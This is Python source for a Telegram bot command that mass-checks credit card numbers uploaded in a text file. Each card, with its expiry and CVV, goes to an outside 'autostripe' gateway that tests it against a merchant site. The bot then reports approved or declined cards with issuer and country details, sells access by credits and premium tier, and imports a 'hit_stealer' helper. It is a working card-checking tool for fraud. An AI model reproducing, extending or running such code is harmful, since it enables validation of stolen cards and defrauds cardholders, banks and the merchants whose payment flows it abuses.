import json
import time
import threading
import asyncio
import httpx
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

async def braintree_auth_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site=dilaboards.com/cc={fullcc}"
    try:
        resp = await session.get(url)
        resp.raise_for_status() # Good practice to check for HTTP errors (4xx or 5xx)
        json_resp = resp.json()
        
        # --- FIX IS HERE ---
        # Use lowercase keys to match the API's response
        status_raw = json_resp.get("status", "")
        message = json_resp.get("response", "")
        # --- END OF FIX ---

        if status_raw.lower() == "declined": # Use .lower() for a more robust check
            status = "Declined ❌"
        elif "approved" in status_raw.lower():
            status = "Approved ✅"
        else:
            status = "Unknown Status"
            
        return {"status": status, "response": message}
    except httpx.HTTPStatusError as e:
        return {"status": "HTTP Error ⚠️", "response": f"Code: {e.response.status_code}"}
    except Exception as e:
        return {"status": "Api Error ⚠️", "response": str(e)}

@Client.on_message(filters.command("mst", [".", "/"]) & filters.reply)
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()

def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(braintree_mass_check(Client, message))
    loop.close()

def parse_cards_from_text(text, organize=False):
    cards = []
    lines = text.splitlines()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if organize:
            digits = ''.join(filter(str.isdigit, line))
            if len(digits) >= 15:
                cc = digits[:16]
                mes = digits[16:18] if len(digits) > 17 else '01'
                ano = digits[18:20] if len(digits) > 19 else '30'
                cvv = digits[20:23] if len(digits) > 22 else '123'
                cards.append(f"{cc}|{mes}|{ano}|{cvv}")
            else:
                cards.append(line)
        else:
            cards.append(line)
    return cards

async def braintree_mass_check(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        is_premium = role == "PREMIUM"
        if not message.reply_to_message or not message.reply_to_message.document:
            await message.reply_text("Please reply to a text file containing cards.")
            return

        file_path = await Client.download_media(message.reply_to_message.document)
        with open(file_path, "r", encoding="utf-8") as f:
            raw_text = f.read()

        cards = parse_cards_from_text(raw_text, organize=is_premium)
        limit = 50 if is_premium else 15
        cards = cards[:limit]
        if not cards:
            await message.reply_text("⚠️ No valid cards found in the file.")
            return

        resp = f"""
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - mass Stripe Premium 

- 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(cards)}
- 𝐂𝐡𝐞𝐜𝐤𝗲𝗱 - Checking CC For {first_name}
- 𝐒𝐭𝐚𝐭𝐮𝘀 - Processing...⌛️
"""
        nov = await message.reply_text(resp, message.id)

        text = f"""
<b>↯ stripe premium Mass [/mst]

Number Of CC Check : [{len(cards)}]
</b>

"""
        amt = 0
        start = time.perf_counter()
        worker_num = int(json.loads(open("FILES/config.json", "r", encoding="utf-8").read())["THREADS"])

        async with httpx.AsyncClient(timeout=40, follow_redirects=True) as session:
            while amt < len(cards):
                batch = cards[amt:amt + worker_num]
                tasks = [mchkfunc(cc, user_id, session) for cc in batch]
                results = await asyncio.gather(*tasks)

                for raw_result, status_text, response_text in results:
                    fullcc = cards[amt]
                    amt += 1

                    getbin = await get_bin_details(fullcc)
                    brand = getbin[0] if len(getbin) > 0 else "Unknown"
                    type_ = getbin[1] if len(getbin) > 1 else "Unknown"
                    level = getbin[2] if len(getbin) > 2 else "Unknown"
                    bank = getbin[3] if len(getbin) > 3 else "Unknown"
                    country = getbin[4] if len(getbin) > 4 else "Unknown"
                    flag = getbin[5] if len(getbin) > 5 else ""

                    proxy_status = "Live ✨"
                    gateway = "Braintree Auth"
                    bin6 = fullcc[:6]

                    finalresp = f"""
{status_text}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response_text}
[⟐] 𝗚𝗮𝘁𝗲  - {gateway}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
"""
                    text += finalresp
                    try:
                        await Client.edit_message_text(message.chat.id, nov.id, text)
                    except:
                        pass
                    await asyncio.sleep(1)

        text += f"""
━━━━━━━━━━━━━
[⟐] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═══════⟐「 𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊  」⟐═══════╝
"""
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(cards))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())